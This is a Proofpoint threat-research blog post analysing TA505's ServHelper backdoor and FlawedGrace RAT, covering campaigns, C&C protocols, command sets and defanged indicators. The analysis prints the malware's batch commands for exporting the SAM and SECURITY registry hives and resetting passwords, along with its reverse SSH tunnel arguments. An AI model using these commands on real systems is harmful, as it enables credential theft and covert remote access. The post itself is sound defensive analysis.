			color: #01579B;
		}
	</style>

    <!-- Resources -->
    <div class="super-nav__mega" data-mega-source="resources" data-sections="2">
      <div class="super-nav__mega-section">
        <div class="super-nav__section-columns">
          <div class="super-nav__main-links">
            <a href="/us/resources"><h6>Resource Library</h6><p>Find the information you're looking for in our library of videos, data sheets, white papers and more.</p></a>
            <a href="/us/blog"><h6>Blog</h6><p>Keep up with the latest news and happenings in the ever&#8209;evolving cybersecurity landscape.</p></a>
            <a href="/us/resources/podcast"><h6>Podcasts</h6><p>Learn about the human side of cybersecurity. Episodes feature insights from experts and executives.</p></a>
            <a href="/us/threat-reference"><h6>Threat Glossary</h6><p>Learn about the latest security threats and how to protect your people, data, and brand.</p></a>
          </div>
          <div class="super-nav__main-links">
            <a href="/us/company/events"><h6>Events</h6><p>Connect with us at events to learn how to protect your people and data from ever&#8209;evolving threats.</p></a>
            <a href="/us/customer-stories"><h6>Customer Stories</h6><p>Read how Proofpoint customers around the globe solve their most pressing cybersecurity challenges.</p></a>
            <a href="/us/webinars"><h6>Webinars</h6><p>Browse our webinar library to learn about the latest threats, trends and issues in cybersecurity.</p></a>
            <a id="cpe-credits" class="super-nav__arrow-link" href="https://go.proofpoint.com/cpe-credit-overview.html?utm_source=website" target="_blank">Watch now to earn your CPE credits</a>
          </div>
        </div>
      </div>
      <div class="super-nav__mega-section">
        <h2>Threat Center</h2>
        <div class="super-nav__mega-content">
          <p>Learn about our threat operations center and read about the latest risks in our threat blog and reports.</p>
          <a class="super-nav__arrow-link" href="/threat-operations-center">Learn More</a>
        </div>
      </div>
    </div>

    <!-- Company -->
    <div class="super-nav__mega" data-mega-source="company" data-sections="2">
      <div class="super-nav__mega-section">
        <div class="super-nav__section-columns">
          <div class="super-nav__main-links">
            <a href="/us/company/about"><h6>About Proofpoint</h6><p>Proofpoint is a leading cybersecurity company that protects organizations' greatest assets and biggest risks: their people.</p></a>
            <a href="/us/why-proofpoint"><h6>Why Proofpoint</h6><p>Today’s cyber attacks target people. Learn about our unique people-centric approach to protection.</p></a>
            <a href="/us/company/careers"><h6>Careers</h6><p>Stand out and make a difference at one of the world's leading cybersecurity companies.</p></a>
          </div>
          <div class="super-nav__main-links">
            <a href="https://investors.proofpoint.com" target="_blank"><h6>Investor Center</h6><p> View Proofpoint investor relations information, including press releases, financial results and events. </p></a>
            <a href="/us/news"><h6>News Center</h6><p>Read the latest press releases, news stories and media highlights about Proofpoint.</p></a>
          </div>
        </div>
      </div>
      <div class="super-nav__mega-section">
        <h2>Support</h2>
        <div class="super-nav__mega-content">
          <p>Access the full range of Proofpoint support services.</p>
          <a class="super-nav__arrow-link" href="/us/support-services">Learn More</a>
        </div>
      </div>
    </div>
  </div>
</div>


  
  
</header>

<div class="layout-container">
    <div>
    <div data-drupal-messages-fallback class="hidden"></div>

  </div>


  <main class="container" role="main">
    <a id="main-content" tabindex="-1"></a>    <section class="row">
      <div class="layout-content">
          <div>
    <div id="block-particle-content">
  
    
      



<article role="article" about="/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505" class="node--type--blog-post node--view-mode--full node node-blog-full">
  
  <div class="breadcrumbs"><div class="nav-crumbs "><div class="breadcrumb__item"><div class="breadcrumb__item"><a href="/us"><span class="svg js-svg-exists"><img src="/themes/custom/proofpoint/dist/app-drupal/assets/home.svg"></span></a></div></div><div class="breadcrumb__item"><a href="/us/blog" class="breadcrum__item-link">Blog</a></div><div class="breadcrumb__item"><a href="/us/blog/threat-insight" class="breadcrum__item-link">Threat Insight</a></div><div class="breadcrumb__item">
                                    ServHelper and FlawedGrace - New malware introduced by TA505
                              </div></div></div>
  <div class="blog-banner">
    <div class="blog-banner__image">      <picture>
                  <source srcset="/sites/default/files/styles/image_1920_400/public/images/Blog/server2.webp?itok=jyxv6pJ0 1x" media="screen and (min-width: 1440px)" type="image/webp"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/images/Blog/server2.webp?itok=SwkDVncg 1x" media="screen and (min-width: 1024px)" type="image/webp"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/images/Blog/server2.webp?itok=vO88JlV0 1x" media="screen and (min-width: 768px)" type="image/webp"/>
              <source srcset="/sites/default/files/styles/image_1920_400/public/images/Blog/server2.png?itok=jyxv6pJ0 1x" media="screen and (min-width: 1440px)" type="image/png"/>
              <source srcset="/sites/default/files/styles/image_1024_400/public/images/Blog/server2.png?itok=SwkDVncg 1x" media="screen and (min-width: 1024px)" type="image/png"/>
              <source srcset="/sites/default/files/styles/image_768_375/public/images/Blog/server2.png?itok=vO88JlV0 1x" media="screen and (min-width: 768px)" type="image/png"/>
                  <img src="/sites/default/files/styles/image_768_300/public/images/Blog/server2.png?itok=dYQRdHTX" typeof="foaf:Image" />

  </picture>


</div>
    <div class="blog-banner__gradient-overlay"></div>
    <div class="blog-banner__heading-wrap">
      
<h1 class="blog-banner__heading">
      <span>ServHelper and FlawedGrace - New malware introduced by TA505</span>

  </h1>
    </div>
  </div>

  <div class="blog-content">
    <div class="blog-content__addthis addthis_toolbox addthis_32x32_style">
      <a class="addthis_button_facebook"></a>
      <a class="addthis_button_twitter"></a>
      <a class="addthis_button_linkedin"></a>
      <a class="addthis_button_email"></a>
      
<span class="addthis_button_subscribe at300b" title=Subscribe>
  <span class="at-icon-wrapper block-subscribe-button__trigger block-subscribe-button__addthis"></span>
</span>
    </div>
        <div class="blog-content__metadata blog-content__metadata-author">
      <span class="blog-content__date">  <time datetime="2019-01-09T17:00:00Z">January 09, 2019</time>

</span>
              <span class="blog-content__author">
                      Dennis Schwarz and Proofpoint Staff
                  </span>
          </div>
    <div class="node-full__body blog-content__body">  <p><strong>Overview</strong></p>

<p>For much of 2018, we observed threat actors increasingly distributing downloaders, backdoors, information stealers, remote access Trojans (RATs), and more as they abandoned ransomware as their primary payload. In November 2018, <u><a href="https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times">TA505</a></u>, a prolific actor that has been at the forefront of this trend, began distributing  a new backdoor we named “ServHelper”. ServHelper has two variants: one focused on remote desktop functions and a second that primarily functions as a downloader. Additionally we have observed the downloader variant download a malware we call “FlawedGrace.” FlawedGrace is a full-featured RAT that we first observed in November 2017. TA505 appears to be actively targeting banks, retail businesses, and restaurants as they distribute these malware families. This targeting falls in line with other activity we reported earlier in 2018.[1] [2]</p>

<p><strong>Campaign Analysis</strong></p>

<p><em>November 9 “Tunnel” Campaign</em></p>

<p>On November 9, 2018, we observed a relatively small email campaign (thousands of messages) delivering a new malware family that we call “ServHelper” based on file names associated with infection. The campaign primarily targeted financial institutions and was attributed to the threat actor TA505. The messages (Figure 1) contained Microsoft Word or Publisher attachments with macros that, when enabled, downloaded and executed the malware. This campaign used the “tunnel” variant of ServHelper, described in the “Malware Analysis” section.</p>

<p><img src="/sites/default/files/fgf1.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 1: Example email message from the November 9 “tunnel” campaign</em></p>

<p><em>November 15 “Downloader” Campaign</em></p>

<p>On November 15, 2018, we saw a similar, but larger campaign (tens of thousands of messages) from the same actor. In addition to financial institutions, this campaign also targeted the retail industry. The messages (Figure 2) contained Microsoft “.doc”, “.pub”, or “.wiz” attachments. The documents contained macros that, when enabled, downloaded and executed the ServHelper malware. This campaign used the “downloader” variant of ServHelper with the tunneling functionality removed.</p>

<p><img src="/sites/default/files/fgf2.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 2: Example email message from the November 15 “downloader” campaign</em></p>

<p><em>December 13 “FlawedGrace” Campaign</em></p>

<p>On December 13, 2018, we observed another large ServHelper “downloader” campaign targeting retail and financial services customers. The messages used a mixture of Microsoft Word attachments with embedded malicious macros, PDF attachments with URLs linking to a fake “Adobe PDF Plugin” webpage linking to the malware (Figure 3), and direct URLs in the email body linking to a ServHelper executable.</p>

<p><em><img src="/sites/default/files/fgf3.png" style="border-width: 0px; border-style: solid;" /></em></p>

<p><em>Figure 3: Example PDF attachment containing a URL linking to the fake </em>“Adobe PDF Plugin” page</p>

<p>In this campaign, we observed ServHelper download (Figure 4) and execute an additional malware that we call “FlawedGrace.” FlawedGrace is a robust remote access trojan (RAT) that we initially encountered in November 2017, but have rarely observed since.</p>

<p> <img src="/sites/default/files/fgf4.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 4: Fiddler screenshot showing ServHelper downloading FlawedGrace</em></p>

<p><strong>ServHelper Malware Analysis</strong></p>

<p>ServHelper is a new malware family -- best classified as a backdoor -- that we first observed in the wild in November 2018. Its name is based on a filename (ServHelper.dll) that we noted in the November 9 “tunnel” campaign described above. A sample from a later campaign used command and control (C&amp;C) URIs containing “/rest/serv.php” which also reference a “serv” component.</p>

<p>The malware is written in Delphi and at the time of this writing is being actively developed. New commands and functionality are being added to the malware in almost every new campaign so we will not focus on one specific sample for this analysis. Rather, we will discuss the malware family generally; see the “Indicators of Compromise” section below for specific reference samples.</p>

<p>As noted, there are two distinct variants of ServHelper: a “tunnel” variant and a “downloader” variant. The “tunnel” variant has more features and focuses on setting up reverse SSH tunnels to allow the threat actor to access the infected host via Remote Desktop Protocol (RDP). Once ServHelper establishes remote desktop access, the malware contains functionality for the threat actor to “hijack” legitimate user accounts or their web browser profiles and use them as they see fit. The “downloader” variant is stripped of the tunneling and hijacking functionality and is used as a basic downloader.</p>

<p>Both variants of ServHelper use the same HTTP C&amp;C protocol on port 443 (HTTPS) and, less frequently, port 80 (HTTP). An example of the initial phone home to the C&amp;C server is shown in Figure 5.</p>

<p><img alt="" src="/sites/default/files/fgf5.png" /></p>

<p><em>Figure 5: Example of ServHelper’s initial phone home</em></p>

<p>Early versions of the malware used a semi-random URI such as: “/ghuae/huadh.php”. Newer versions have started using more typical URIs such as:</p>

<ul><li>/support/form.php</li>
	<li>/rest/serv.php</li>
	<li>/sav/s.php</li>
</ul><p>Most of the C&amp;C domains that we have observed have been in the “.pw” top-level domain (TLD) such as:</p>

<ul><li>checksolutions[.]pw</li>
	<li>afgdhjkrm[.]pw</li>
	<li>pointsoft[.]pw</li>
	<li>dedoshop[.]pw</li>
</ul><p>However, recently the developer has added support for “.bit” C&amp;C domains; this TLD is associated with the cryptocurrency Namecoin and requires special DNS servers that the malware uses:</p>

<ul><li>dedsolutions[.]bit</li>
	<li>arepos[.]bit</li>
</ul><p>The POST data in these C&amp;C communications contains three URL-encoded parameters: “key”, “sysid”, and “resp”. The “key” parameter is a hardcoded string in the malware that does not appear to be used elsewhere in the code. Examples of observed keys include:</p>

<ul><li>Gsiss744@sd</li>
	<li>asdgdgYss455</li>
	<li>#567sisGdsa</li>
</ul><p>The “sysid” parameter contains a campaign ID in newer versions of the malware, the Windows version running on the infected machine, system architecture, username, and a random integer. Examples of observed campaign IDs include:</p>

<ul><li>clean12</li>
	<li>chistka12.17</li>
	<li>noP_19</li>
	<li>nonRDP</li>
	<li>no24</li>
	<li>ny_upd</li>
</ul><p>The “resp” parameter contains responses to commands received from the controller.</p>

<p>An example command sent from the C&amp;C server to the infected machine can be seen in the Fiddler screenshot in Figure 4 above. It contains a command, carrot (“^”) delimiter, and command arguments. We observed the following commands in the malware:</p>

<p><strong>nop</strong></p>

<p>Implements a keep-alive type of functionality. The infected machine responds to the C&amp;C server with a “nop ok” message.</p>

<p><strong>tun (“tunnel” variant only)</strong></p>

<p>Sets up a reverse SSH tunnel connecting the C&amp;C server to the infected system’s RDP port (3389). In earlier versions, a loader component performed the initial setup for this and other commands by:</p>

<ul><li>Extracting and dropping an OpenSSH binary from its PE resources</li>
	<li>Extracting, dropping, and configuring the RDP Wrapper Library software from its PE resources</li>
	<li>Creating a new user “supportaccount” with a password of “<em>Ghar4f5”</em></li>
	<li>Adding this user to the “Remote Desktop Users” and “Administrators” groups</li>
</ul><p>In more recent versions, this functionality of the loader component was integrated into the core ServHelper code, using built-in Windows remote desktop support instead of a third-party software package. This command sets up a reverse SSH tunnel by executing the dropped OpenSSH binary with the following command line arguments:</p>

<p><em>-N -R &lt;remote port&gt;:localhost:3389 tunnel@&lt;C&amp;C server&gt;</em></p>

<p>Once configured, ServHelper sends a “tun ok\r\nport:&lt;remote port&gt; tun pid:&lt;SSH process id&gt;” to the C&amp;C server.</p>

<p><strong>slp</strong></p>

<p>Sets a sleep timeout.</p>

<p><strong>fox (“tunnel” variant only)</strong></p>

<p>Copies a Firefox web browser profile from one user to another. Earlier versions used the Windows “xcopy” command. Later versions download a self-extracting RAR file from the C&amp;C server (/cp/cp.exe) and decompress it using the password “123”. One of the files in this archive is a piece of software known as "Runtime's Shadow Copy" and it is used to copy the web browser profiles.</p>

<p><strong>chrome (“tunnel” variant only)</strong></p>

<p>Similar to the “fox” command but for Chrome web browser profiles.</p>

<p><strong>killtun (“tunnel” variant only)</strong></p>

<p>Kills an SSH tunnel process associated with a particular remote port. Once killed, it sends a “killtun ok” message to the C&amp;C server.</p>

<p><strong>tunlist (“tunnel” variant only)</strong></p>

<p>Gets a list of all active SSH tunnels and responds to the C&amp;C server with a message containing “active tun: &lt;remote port&gt;” entries for each active tunnel.</p>

<p><strong>killalltuns (“tunnel” variant only)</strong></p>

<p>Kills all SSH tunnel processes.</p>

<p><strong>shell</strong></p>

<p>Executes a shell command and sends the response to the C&amp;C server.</p>

<p><strong>load</strong></p>

<p>Downloads and runs an executable from a specified URL. Responds to the C&amp;C server with either “load no param ok” or “load param ok” depending if any command-line arguments were passed to the downloaded executable.</p>

<p><strong>socks (“tunnel” variant only)</strong></p>

<p>Similar to the “tun” command, but allows a reverse SSH tunnel to be built between the C&amp;C server to any server/port (as specified by the command argument) through the infected system. Once configured, a “socks ok\r\nport:&lt;remote port&gt; tun pid:&lt;SSH process id&gt;” message is sent to the C&amp;C server.</p>

<p><strong>selfkill</strong></p>

<p>Removes the malware from the infected machine.</p>

<p><strong>loaddll (“downloader” variant only)</strong></p>

<p>A newer command that has only been observed in the “downloader” variant. Similar to the “load” command, but for DLLs.</p>

<p><strong>bk (“tunnel” variant only)</strong></p>

<p>A newer command similar to the “tun” command. “bk” allows the reverse SSH tunnel to be set up using a C&amp;C specified remote host instead of the hardcoded C&amp;C server.</p>

<p><strong>hijack (“tunnel” variant only)</strong></p>

<p>A newer command that appears to hijack a user account with a known password (“123”). It does so by creating and scheduling a task “test” to run a batch file containing the following commands:</p>

<ul><li>reg export hklm\sam c:\sam.reg</li>
	<li>reg export hklm\security c:\sec.reg</li>
	<li>net user &lt;command argument username&gt; 123</li>
</ul><p>It then schedules a task “test2” to run another batch file containing the following commands:</p>

<ul><li>schtasks /delete /tn "test" /F</li>
	<li>reg import c:\sam.reg</li>
	<li>reg import c:\sec.reg</li>
	<li>schtasks /delete /tn "test2" /F</li>
</ul><p>Finally it runs the first scheduled task ands send a “ready! try to login with pass 123” message to the C&amp;C server.</p>

<p><strong>forcekill (“tunnel” variant only)</strong></p>

<p>A newer command that is similar to the “killalltuns” but uses the Windows “taskkill” command.</p>

<p><strong>sethijack (“tunnel” variant only)</strong></p>

<p>A newer command that controls an “alerting” mechanism. A separate program thread monitors user logons. When a legitimate user becomes active and the threat actor is connected to the infected system using the previously created “supportaccount” account, it runs the “chrome” and “fox” commands, copying the legitimate user’s web browser profiles to the “supportaccount” user. It then alerts the threat actor by sending message boxes containing “login detected, begin hijacking” and “profiles hijacked!” messages. These are sent by a “msg.exe” program contained in the “cp.exe” archive discussed in the “fox” command above.</p>

<p><strong>chromeport (“tunnel” variant only)</strong></p>

<p>A newer command that implements the same functionality as the “chrome” command.</p>

<p>During some of the ServHelper “downloader” campaigns, we observed commands (e.g., as shown in Figure 4 above) instructing the malware to download and execute another malware we call “FlawedGrace”.</p>

<p><strong>FlawedGrace Malware Analysis</strong></p>

<p>FlawedGrace is a remote access trojan (RAT) named after debugging artifacts (class names) left in the analyzed sample (see Figure 6).</p>

<p><img src="/sites/default/files/fgf6.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 6: “Grace” class names shown by IDA Pro</em></p>

<p>The malware is written in C++. It is a very large program and makes extensive use of object-oriented and multithreaded programming techniques. This makes reverse engineering and debugging the malware both difficult and time consuming. The coding style and techniques suggest that FlawedGrace was not written by the same developer as ServHelper.</p>

<p>We initially observed FlawedGrace in an email campaign as early as November 2017, but until the recent ServHelper campaigns, we had not observed it being actively distributed again. The malware usually contains a debug string including a “version number” and “build date” distinct from the PE compile timestamp, allowing searches of various malware repositories to find additional versions:</p>

<ul><li>Unknown version number built at “Aug  7 2017 22:28:47”</li>
	<li>Version 2.0.7 built at “Oct 18 2017 04:18:39”</li>
	<li>Version 2.0.8 built at “Oct 26 2017 12:05:44”</li>
	<li>Version 2.0.9 built at “Nov  4 2017 22:28:10”</li>
	<li>Version 2.0.10 built at “Nov 20 2017 10:53:33”</li>
	<li>Version 2.0.11 built at “Dec 16 2017 08:02:46”</li>
</ul><p>Per the malware’s debug strings, significant development took place during the end of 2017. The ServHelper campaigns were distributing version 2.0.10 of the malware.</p>

<p>FlawedGrace creates, encrypts, and stores a configuration file containing the C&amp;C IPs and ports in a “&lt;hex digits&gt;.dat” file (e.g., “C:\ProgramData\21851a60.dat”). The first 16 bytes of the file are an AES initialization vector (IV). The rest of the data is AES-encrypted in CBC mode. In the analyzed sample, the AES key was hardcoded as “c3oeCSIfx0J6UtcV”. Once decrypted, the configuration data is stored as a custom serialization (Figure 7). Early versions of the malware used the class names “GraceParams” and “GraceValue” when interacting with this part of the code, so it is likely that the serialization was designed and developed by the malware developer and not a standard format.</p>

<p><img src="/sites/default/files/fgf7.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 7: Plaintext configuration file showing C&amp;C IP and port</em></p>

<p>FlawedGrace uses a complicated binary protocol for its command and control. It can use a configurable port for communications, but all samples we have observed to date have used port 443. Figure 8 shows an example of the first four messages between an infected system and C&amp;C server.</p>

<p><img src="/sites/default/files/fgf8.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 8: FlawedGrace’s initial C&amp;C communications.</em></p>

<p>We are still reverse engineering and documenting the protocol, but we can provide an overview of the initial C&amp;C communications below:</p>

<p><strong>Message 1</strong></p>

<p>Initial beacon from infected system. It is a 14-byte binary structure that contains at least the following parts:</p>

<ul><li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x4: magic bytes "GCRG" (DWORD)</li>
</ul><p><strong>Message 2</strong></p>

<p>Key verification message from infected system. We believe that this is used to verify that one of the encryption keys (static key) is the same on both the malware and C&amp;C server. It is a 52-byte binary structure that contains the following analyzed offsets, among other components still under analysis:</p>

<ul><li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x14: MD5 hash of the following pieces (16 bytes)
	<ul><li>A static key which has always been “static pass” in the samples analyzed</li>
		<li>The random bytes at offset 0x24 that have been hex encoded and uppercased</li>
	</ul></li>
	<li>Offset 0x24: random bytes (16 bytes)</li>
</ul><p><strong>Message 3</strong></p>

<p>Key exchange message from C&amp;C server. This message delivers a second encryption key (dynamic key) used for further data transfers. It is a 42-byte structure that contains the following analyzed offsets, among other components still under analysis:</p>

<ul><li>Offset 0x0: CRC32 hash of remaining data (DWORD)</li>
	<li>Offset 0x1a: dynamic key (16 bytes)</li>
</ul><p><strong>Message 4</strong></p>

<p>An example of data transfer between infected system and C&amp;C server. It starts with a 38-byte binary header that contains the following analyzed offsets, among other components still under analysis:</p>

<ul><li>Offset 0x0: CRC32 hash of the next 10 bytes (DWORD)</li>
	<li>Offset 0xE: AES IV (16 bytes)</li>
</ul><p>Following the header is the data that has been AES-encrypted in CBC mode. The AES key is generated using the “static key” and the “dynamic key” from messages 3 and 4 above. An example of key generation in Python appears in Figure 9.</p>

<p><img src="/sites/default/files/fgf9.png" style="border-width: 0px; border-style: solid;" /></p>

<p><em>Figure 9: Example FlawedGrace C&amp;C data transfer encryption key generation in Python</em></p>

<p>Figure 10 shows an example of the plaintext data transferred in message 4.</p>

<p><img alt="" src="/sites/default/files/fgf10.png" /></p>

<p><em>Figure 10: Example FlawedGrace C&amp;C message 4 plaintext data</em></p>

<p>This message contains various system and malware information that has been serialized using the same method as for configuration files. The serialized data is then packaged within additional binary data structures.</p>

<p>While there are other message types with their own formats, the examples here provide initial insight into FlawedGrace’s C&amp;C protocol.</p>

<p>FlawedGrace also uses a series of commands, provided below for reference:</p>

<ul><li>target_remove</li>
	<li>target_update</li>
	<li>target_reboot</li>
	<li>target_module_load</li>
	<li>target_module_load_external</li>
	<li>target_module_unload</li>
	<li>target_download</li>
	<li>target_upload</li>
	<li>target_rdp</li>
	<li>target_passwords</li>
	<li>target_servers</li>
	<li>target_script</li>
	<li>destroy_os</li>
	<li>desktop_stat</li>
</ul><p><strong>Conclusion</strong></p>

<p>Threat actor TA505 is both consistent and prolific. When the group distributes new malware, it may be a blip (like Bart ransomware, which was only distributed for one day in 2016) or like Locky ransomware it may become the dominant strain of malware in the wild. In this case, the group has started distributing two variants on a new backdoor we named ServHelper and a RAT we call FlawedGrace. This also extends the trend that emerged in 2018, in which threat actors increasingly focused on distribution of downloaders, information stealers, RATS, and other malware that can remain resident on victim devices for far longer than destructive, “smash and grab” malware like ransomware. We will continue to observe the distribution of these three malware variants but, at this time, they do not appear to be one-offs, but rather long-term investments by TA505.</p>

<p><strong>References</strong></p>

<p>[1] <a href="https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments">https://www.proofpoint.com/us/threat-insight/post/ta505-targets-us-retail-industry-personalized-attachments</a></p>

<p>[2] <u><a href="https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware">https://www.proofpoint.com/us/threat-insight/post/leaked-ammyy-admin-source-code-turned-malware</a></u></p>

<p> </p>

<p><strong>Indicators of Compromise (IOCs)</strong></p>

<table border="1" cellpadding="0" cellspacing="0" width="624"><tbody><tr><td style="width:382px;">
			<p><strong>IOC</strong></p>
			</td>
			<td style="width:88px;">
			<p><strong>IOC Type</strong></p>
			</td>
			<td style="width:154px;">
			<p><strong>Description</strong></p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>52c72a9de2f6e892f07827add85ad913b0541cd5c8449aadc2722f8eb75e548c</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign attachment</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://officemysuppbox[.]com/staterepository</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign payload</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>1b0859ddbdebcb9d2bb46de00d73aa21bc617614b8123054426556783b211bc8</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxps://checksolutions[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxps://rgoianrdfa[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxps://arhidsfderm[.]pw/ghuae/huadh.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 9 “Tunnel” campaign ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p> </p>
			</td>
			<td style="width:88px;">
			<p> </p>
			</td>
			<td style="width:154px;">
			<p> </p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>eb66ebb95a3dcecae64c61f611a9332fbf460d1b8039d3ab7e4f220104a4bec4</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign attachment</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://offficebox[.]com/host32</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign payload</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>3cd7e0a8321259e8446b2a9da775aae674715c74ff4923cfc8ec5102f380d41a</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>November 15 “Downloader” campaign ServHelper</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p> </p>
			</td>
			<td style="width:88px;">
			<p> </p>
			</td>
			<td style="width:154px;">
			<p> </p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>f4b9219f329803dd45afd5646351de456e608dd946830c961ec66c6c25e52cac</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign attachment</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://office365onlinehome[.]com/host32</p>

			<p> </p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign payload</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>d56429d6d0222022fe8f4cb35a28cd4fb83f87b666a186eb54d9785f01bb4b58</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign ServHelper</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxps://afgdhjkrm[.]pw/aggdst/Hasrt.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace”  campaign ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>efcee275d23b6e71589452b1cb3095ff92b10ab68cd07957b2ad6be587647b74</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign FlawedGrace</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>46.161.27[.]241:443</p>
			</td>
			<td style="width:88px;">
			<p>IP:Port</p>
			</td>
			<td style="width:154px;">
			<p>December 13 “FlawedGrace” campaign FlawedGrace C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p> </p>
			</td>
			<td style="width:88px;">
			<p> </p>
			</td>
			<td style="width:154px;">
			<p> </p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>9fccd107bd0aee3a2f39ad76a49758309c95545d8154b808eec24d2b51dc4579</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://dedsolutions[.]bit/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://dedoshop[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://asgaage[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxp://sghee[.]pw/sav/s.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“sethijack” command ServHelper C&amp;C</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>a9492312f1258567c3633ed077990fe053776cd576aa60ac7589c6bd7829d549</p>
			</td>
			<td style="width:88px;">
			<p>SHA256</p>
			</td>
			<td style="width:154px;">
			<p>“loaddll” command ServHelper</p>
			</td>
		</tr><tr><td style="width:382px;">
			<p>hxxps://vesecase[.]com/support/form.php</p>
			</td>
			<td style="width:88px;">
			<p>URL</p>
			</td>
			<td style="width:154px;">
			<p>“loaddll” command ServHelper C&amp;C</p>
			</td>
		</tr></tbody></table><p> </p>

<p><strong>ET and ETPRO Suricata/Snort Signatures</strong></p>

<p>2833522          ETPRO TROJAN Observed Malicious SSL Cert (HuadhServHelper RAT CnC)</p>

<p>2833552          ETPRO TROJAN HuadhServHelper RAT CnC Domain Observed in SNI</p>

<p>2833881          ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2833985          ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2834074          ETPRO TROJAN Observed Malicious SSL Cert (ServHelper CnC)</p>

<p>2834233          ETPRO TROJAN ServHelper CnC Inital Checkin</p>

<p>2828489          ETPRO TROJAN FlawedGrace CnC Activity</p>

</div>
  </div>
  
<div class="blog-subscribe">
  <div class="blog-subscribe__inner">
    <div class="blog-subscribe__copy">
      <p>Subscribe to the Proofpoint Blog</p>
    </div>
    <div class="blog-subscribe__form">
      
<script src="//app-abj.marketo.com/js/forms2/js/forms2.min.js"></script>
<div class="mk-form">
  <div class="mk-form__form-container">
    <script type="IN/Form2"
      data-data-form="mktoForm_9701"
      data-field-firstname="FirstName"
      data-field-lastname="LastName"
      data-field-email="Email"
      data-field-company="Company"
      data-field-title="Title"
      data-field-state="State"
      data-field-country="Country"
    ></script>
    <form
      id="mktoForm_9701"
      data-mkto-id="9701"
      data-mkto-base="//app-abj.marketo.com"
      data-munchkin-id="309-RHV-619"
      data-submit-text=""
      data-redirect-link=""
